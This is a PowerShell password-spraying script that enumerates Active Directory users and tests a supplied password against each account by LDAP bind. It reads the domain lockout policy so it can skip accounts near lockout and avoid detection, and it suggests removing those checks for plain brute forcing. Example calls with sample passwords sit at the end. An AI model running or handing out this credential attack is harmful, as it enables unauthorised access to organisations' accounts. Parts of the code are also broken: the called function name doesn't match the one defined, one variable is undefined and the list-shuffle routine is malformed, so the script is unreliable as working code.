function Invoke-BruteCredentials
{
<#
.SYNOPSIS

Attempts to validate a password over a list of Users on a Domain.  Uses an LDAP Bind to test authentication

Author: Matt "Rudy" Benton @ruddawg26
Idea-Support: Brian Dillensnyder
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Attempts to make an LDAP bind from a list of accounts and provided password. Determines Lockout threshold and will not attempt the password guess on that account if the account is within one away from a lockout. Haven't messed with in a few years but did have some errors in a large domain determining accurate lockout for whatever reason.  If just want brute forcer strip out lockout checks.

.NOTES

.PARAMETER

.EXAMPLE

.LINK

#>

[CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [String[]] $Password,
        #ToDo - better set parameters and put in parameter sets
        [String] $PasswordFile,
        [Switch] $checklockout

    )

    Set-StrictMode -Version 2.0

    $passwordList = New-Object System.Collections.ArrayList
    $userList = New-Object System.Collections.ArrayList


Function Invoke-RandomizeList{
    #A Fisher-Yates Shuffle of the Array
    [Parameter(Mandatory = $True)]
    [array]$List

    [int]$n=[int]$x=$List.count-1
   
    [array]$tmparray


    for([int]$n=$List.count; $n -ne 0; $n--) {
    [int] $i = Get-Random $n
    $tmparray.add($List[$i])
    $List.removeat($i)
    }
    $List=$tmparray
    return $List
   
    }


try{
#get current computer domain object
$OnDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Name
$objdomain = [ADSI]""
}
catch
{
write-host "This computer is not on a Domain"
}

Write-Verbose "[-] Getting Domain Information"

$objdomain=[ADSI]""

#Get Domain Information
$Domain = $objdomain.distinguishedname
$LockoutThreshold = $objdomain.LockOutThreshold
$MinPwdLength = $objdomain.minpwdlength
$LockoutDuration = [timespan]([math]::Abs($objdomain.convertLargeIntegerToInt64($objdomain.lockoutduration[0])))
$LockoutObservationWindow = [timespan]([math]::Abs($objdomain.convertLargeIntegerToInt64($objdomain.lockoutobservationwindow[0])))


$currentdomain="LDAP://$domain"
$users="LDAP://CN=users,$domain"
$ManagedServiceAccounts="LDAP://CN=Managed Service Accounts,$domain"
#$group="LDAP://
$objUsers=[ADSI]$users

#Here add a parameter Domain Additional INFO to display this if set

$domainprops = @{'MinPwdLength'=$MinPwdLength;
                 'LockoutThreshold'=$LockoutThreshold;
                 'LockOutObservationWindow'=$LockOutObservationWindow;
                 'LockOutDuration'=$LockOutDuration}

$domaininfoobj = New-Object -TypeName PSObject -Property $props


$objusers.children |Foreach-Object {
#Start-Sleep 2
$username= $_.samaccountname

#First Check to see if account will lockout with one more bad password attempt
If([int] $_.badPwdCount.value -lt ($lockoutthreshold.value-1)){

#write-Verbose "[-] Checking for $username and $password at $currentdomain"
$querycheck = New-Object System.DirectoryServices.DirectoryEntry($currentdomain, $Username, $Password)

if($querycheck.name -eq $null){Write-host "Failed Login" $username }

else{write-host "Successful Login: $Username $Password"}
}
else{write-Verbose "$username not tried.  BadPwdCount is "$_.badPwdCount.value}
}




}



Brute-Credentials -verbose '2wsx@WSX2wsx@WSX'


Brute-Credentials '!QAZxsw2#@EDCvfr4'

try{$querycheck = New-Object System.DirectoryServices.DirectoryEntry($currentdomain, $Username, $Password)}
catch{write-host "Failed"}
